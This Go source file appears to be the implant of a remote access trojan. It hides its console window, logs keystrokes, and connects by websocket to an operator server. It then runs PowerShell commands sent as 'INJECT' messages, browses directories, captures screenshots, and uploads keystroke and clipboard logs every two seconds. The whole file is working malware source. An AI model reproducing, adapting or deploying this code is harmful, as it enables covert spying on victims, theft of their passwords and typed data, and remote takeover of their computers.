package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"log"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	ps "github.com/bhendo/go-powershell"
	"github.com/bhendo/go-powershell/backend"
	"github.com/gonutz/w32"
	"github.com/gorilla/websocket"

	"github.com/d0minikt/dragons/lib"
	"github.com/d0minikt/dragons/target/gather"
	"github.com/d0minikt/dragons/target/platform"
)

var debug = false

var (
	client       = ""
	keylog       = []string{}
	applog       = []string{}
	clipboardlog = []string{}
)

// HideWindow hides the current console window that appears when compiled to exe
func HideWindow() {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, w32.SW_HIDE)
		}
	}
}

func main() {
	flag.BoolVar(&debug, "debug", false, "Debug mode")
	addr := "dragons-land.herokuapp.com"
	if !debug {
		HideWindow()
		addr = "0.0.0.0"
	}

	flag.Parse()
	log.SetFlags(0)

	// powershell
	backend := &backend.Local{}
	shell, err := ps.New(backend)
	if err != nil {
		panic(err)
	}
	defer shell.Exit()

	// keylogger
	keypressed := make(chan platform.KeylogFunc)
	go platform.StartKeylogger(keypressed)

	// init websocket
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	u := url.URL{Scheme: "ws", Host: addr, Path: "/ws"}
	log.Printf("connecting to %s", u.String())
	ws, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer ws.Close()

	msg := lib.ConnectTargetAction{
		Type:    "CONNECT_TARGET",
		Payload: gather.GetTargetDetails(shell, keylog, applog, clipboardlog),
	}
	ws.WriteJSON(msg)
	done := make(chan struct{})

	// receive message
	go func() {
		defer close(done)
		for {
			_, message, err := ws.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				return
			}
			action := lib.Action{}
			json.Unmarshal(message, &action)
			switch action.Type {
			case "DATA":
				continue
			case "CONNECT_TO_TARGET":
				action := lib.StringAction{}
				json.Unmarshal(message, &action)
				log.Println(action)
				client = action.Payload
			case "INJECT":
				action := lib.SentFromClientAction{}
				json.Unmarshal(message, &action)
				stdout, stderr, err := shell.Execute(action.Payload)
				var errMessage string
				if err != nil {
					stdout = stderr
					errMessage = "ERROR"
				}
				ws.WriteJSON(lib.QueryAction{
					Type: "STDOUT",
					Payload: map[string]string{
						"stdout": strings.TrimSpace(stdout),
						"error":  errMessage,
					},
					To: action.From,
				})
			case "GET_DIRECTORY":
				action := lib.SentFromClientAction{}
				json.Unmarshal(message, &action)

				dir, _ := lib.GetDirectory(action.Payload)
				if len(dir.Files) > 0 {
					ws.WriteJSON(lib.QueryAction{
						Type:    "GET_DIRECTORY",
						Payload: dir,
						To:      action.From,
					})
				}
			case "SCREENSHOT":
				action := lib.SentFromClientAction{}
				json.Unmarshal(message, &action)

				bytes := gather.Screenshot("./f.jpg")
				base64Str := base64.StdEncoding.EncodeToString(bytes)
				ws.WriteJSON(lib.QueryAction{
					Type:    "SCREENSHOT",
					Payload: base64Str,
					To:      action.From,
				})
			default:
				log.Println(action)
			}
		}
	}()

	// how often the data will be sent to server
	ticker := time.NewTicker(time.Second * 2)
	defer ticker.Stop()

	// other listeners
	for {
		select {
		// key pressed listener
		case fx := <-keypressed:
			key, isSingle := fx()
			if isSingle {
				if len(keylog) > 0 {
					keylog[len(keylog)-1] += key
				} else {
					keylog = append(keylog, "")
				}
			} else {
				keylog = append(keylog, "["+key+"]", "")
			}
			println(platform.GetCurrentWindow())
		case <-done:
			return
		// send data periodically
		case <-ticker.C:
			ws.WriteJSON(lib.QueryAction{
				Type: "LOG",
				Payload: lib.Log{
					Keylog:       keylog,
					Applog:       applog,
					Clipboardlog: clipboardlog,
				},
				To: client,
			})

			keylog = []string{}
			applog = []string{}
			clipboardlog = []string{}
		// error, such as keyboard interrupt
		case <-interrupt:
			log.Println("interrupt")
			return
		}
	}
}
